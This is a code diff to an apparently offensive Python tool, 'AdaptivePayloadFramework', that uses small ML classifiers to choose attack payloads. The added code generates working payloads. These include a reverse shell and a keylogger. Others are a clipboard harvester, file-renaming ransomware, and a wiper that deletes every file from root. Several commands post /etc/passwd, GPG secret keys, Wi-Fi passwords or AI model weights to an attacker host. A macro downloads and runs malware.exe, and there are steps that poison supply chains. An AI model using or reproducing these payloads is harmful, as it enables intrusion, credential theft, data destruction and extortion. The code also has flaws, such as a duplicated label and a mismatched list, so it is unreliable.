@@ -4,13 +4,16 @@ import subprocess
 import base64
 import requests
 import random
-import time
-import smtplib
-from email.message import EmailMessage
+import os
 import json
-import numpy as np
 from sklearn.tree import DecisionTreeClassifier
 from sklearn.neural_network import MLPClassifier
+import numpy as np
+import base64
+import requests
+import smtplib
+from email.message import EmailMessage
+import time
 
 
 class AdaptivePayloadFramework:
@@ -20,6 +23,10 @@ class AdaptivePayloadFramework:
         self.lhost = None
         self.lport = None
         self.email_config = self.load_email_config()
+
+        # Train models during initialization
+        self.decision_tree_model = self._train_decision_tree()
+        self.neural_network_model = self._train_neural_network()
 
     # =============================
     # Email Configuration
@@ -69,22 +76,22 @@ class AdaptivePayloadFramework:
             print("Skipping email configuration setup.")
 
     # =============================
-    # Step 1: Train Decision Tree
+    # Train Decision Tree
     # =============================
     def _train_decision_tree(self):
         """
         Trains a Decision Tree Classifier for payload recommendations.
         """
         X = [
-            [0, 1, 1, 0],  # Windows, Open ports, Firewall, x86
-            [0, 1, 1, 1],  # Windows, Open ports, Firewall, x64
-            [1, 1, 0, 1],  # Linux, Open ports, No defenses, x64
-            [2, 0, 1, 1],  # macOS, No open ports, Firewall, x64
-            [1, 1, 1, 1],  # Linux, Open ports, Firewall, x64
-            [1, 0, 0, 1],  # Linux, No open ports, No defenses, x64
-            [2, 1, 1, 0],  # macOS, Open ports, Firewall, x86
-            [3, 1, 0, 1],  # IoT, Open ports, No defenses, x64
-            [4, 1, 1, 1],  # Cloud, Open ports, Firewall, x64
+            [0, 1, 1, 0],
+            [0, 1, 1, 1],
+            [1, 1, 0, 1],
+            [2, 0, 1, 1],
+            [1, 1, 1, 1],
+            [1, 0, 0, 1],
+            [2, 1, 1, 0],
+            [3, 1, 0, 1],
+            [4, 1, 1, 1],
         ]
         y = [
             "powershell_reverse",
@@ -102,7 +109,7 @@ class AdaptivePayloadFramework:
         return model
 
     # =============================
-    # Step 2: Train Neural Network
+    # Train Neural Network
     # =============================
     def _train_neural_network(self):
         """
@@ -127,7 +134,7 @@ class AdaptivePayloadFramework:
         return model
 
     # =============================
-    # Step 3: Predict Payload Type
+    # Predict Payload Type
     # =============================
     def _predict_payload_type(self, os_type, open_ports, defenses, arch):
         """
@@ -148,6 +155,19 @@ class AdaptivePayloadFramework:
                 "steganographic",
                 "iot_specific",
                 "cloud_payload",
+                "keylogger",
+                "clipboard_harvester",
+                "disk_wiper",
+                "reverse_http",
+                "wifi_credentials_stealer",
+                "key_retriever",
+                "mshta_loader",
+                "meterpreter_https",
+                "meterpreter_https",
+                "excel_macro",
+                "supply_chain_attacks",
+                "ai_model_exfiltration",
+                
             ][prediction]
         return prediction
 
@@ -172,7 +192,7 @@ class AdaptivePayloadFramework:
         elif payload_type == "python_reverse":
             payload = f"import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(('{self.lhost}',{self.lport}));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(['/bin/bash']);"
         elif payload_type == "dns_tunneling":
-            payload = f"import dns.resolver;data='Sensitive_Data';domain=f'{data}.{self.lhost}';dns.resolver.resolve(domain, 'A');"
+            payload = f"import dns.query;data='Sensitive_Data';domain=f'{data}.{self.lhost}';dns.query.resolve(domain, 'A');"
         elif payload_type == "iot_worm":
             payload = f"telnet {self.target_ip} -e /bin/sh"
         elif payload_type == "steganographic":
@@ -181,9 +201,100 @@ class AdaptivePayloadFramework:
             payload = f"nc {self.target_ip} {self.lport} -e /bin/sh"
         elif payload_type == "cloud_payload":
             payload = f"curl -X POST -d 'payload' http://{self.lhost}:{self.lport}/api/execute"
+        elif payload_type == "keylogger":
+            payload = (
+                f"import pynput.keyboard, threading;\n"
+                f"def on_press(key): open('/tmp/keylog.txt', 'a').write(str(key)+'\\n');\n"
+                f"listener = pynput.keyboard.Listener(on_press=on_press);\n"
+                f"listener.start(); listener.join();"
+            )
+        elif payload_type == "clipboard_harvester":
+            payload = (
+                f"import pyperclip, time;\n"
+                f"while True:\n"
+                f"    data = pyperclip.paste();\n"
+                f"    open('/tmp/clipboard_dump.txt', 'a').write(data+'\\n');\n"
+                f"    time.sleep(10);"
+            )
+        elif payload_type == "ransomware":
+            payload = (
+                f"import os;\n"
+                f"for root, dirs, files in os.walk('/'):\n"
+                f"    for file in files:\n"
+                f"        try:\n"
+                f"            filepath = os.path.join(root, file);\n"
+                f"            os.rename(filepath, filepath+'.locked');\n"
+                f"        except Exception: pass;"
+            )
+        elif payload_type == "disk_wiper":
+            payload = (
+                f"import os;\n"
+                f"for root, dirs, files in os.walk('/'):\n"
+                f"    for file in files:\n"
+                f"        try:\n"
+                f"            filepath = os.path.join(root, file);\n"
+                f"            os.remove(filepath);\n"
+                f"        except Exception: pass;"
+            )
+        elif payload_type == "reverse_http":
+            payload = f"curl -X GET http://{self.lhost}:{self.lport}/reverse_shell"
+        elif payload_type == "data_exfiltration":
+            payload = (
+                f"import requests;\n"
+                f"files = {'files': open('/etc/passwd', 'rb')};\n"
+                f"requests.post('http://{self.lhost}:{self.lport}/upload', files=files);"
+            )
+        elif payload_type == "wifi_credentials_stealer":
+            payload = (
+                f"netsh wlan export profile key=clear folder=C:\\temp && "
+                f"curl -F 'file=@C:\\temp\\wifi.txt' http://{self.lhost}:{self.lport}"
+            )
+        elif payload_type == "key_retriever":
+            payload = (
+                f"gpg --export-secret-keys | curl -F 'keys=@-' http://{self.lhost}:{self.lport}"
+            )
+        elif payload_type == "mshta_loader":
+            payload = (
+                f"mshta http://{self.lhost}:{self.lport}/malicious.hta"
+            )
+        elif payload_type == "meterpreter_https":
+            payload = (
+                f"msfvenom -p windows/meterpreter/reverse_https LHOST={self.lhost} LPORT={self.lport} -f exe > reverse_https.exe"
+            )
+        elif payload_type == "excel_macro":
+            payload = (
+                f"Sub AutoOpen()\n"
+                f"    Dim x As Object\n"
+                f"    Set x = CreateObject(\"WScript.Shell\")\n"
+                f"    x.Run \"cmd /c curl -o C:\\malware.exe http://{self.lhost}:{self.lport}/malware.exe && C:\\malware.exe\"\n"
+                f"End Sub"
+            )
+        elif payload_type == "supply_chain_attacks":
+            # Enhanced Supply Chain Attack Payload
+            payload = (
+                "echo 'Injecting malicious dependency...' && "
+                # Replace or tamper with files in Jenkins workspace or GitHub Actions runner
+                f"scp /tmp/malicious_dependency.py {self.lhost}:/var/lib/jenkins/workspace/ && "
+                # Poisoning PyPI or npm package (e.g., uploading a malicious version)
+                "pip install --extra-index-url http://malicious-repo.com malicious_package && "
+                "npm publish --registry http://malicious-repo.com"
+            )
+        elif payload_type == "ai_model_exfiltration":
+            # Enhanced AI Model Exfiltration Payload
+            payload = (
+                "import os, requests\n"
+                "common_paths = ['/models/model_weights.h5', '/models/model.pth', '/var/tmp/model.pb', '/var/lib/ai/models']\n"
+                "for model_path in common_paths:\n"
+                "    if os.path.exists(model_path):\n"
+                "        with open(model_path, 'rb') as model_file:\n"
+                f"            requests.post('http://{self.lhost}:{self.lport}/upload', files={{'file': model_file}})\n"
+            )
+        else:
+            print(f"Unknown payload type: {payload_type}")
+            return None
+
         print(f"Generated payload: {payload}")
         return payload
-
     # =============================
     # Step 5: Mutate Payload
     # =============================
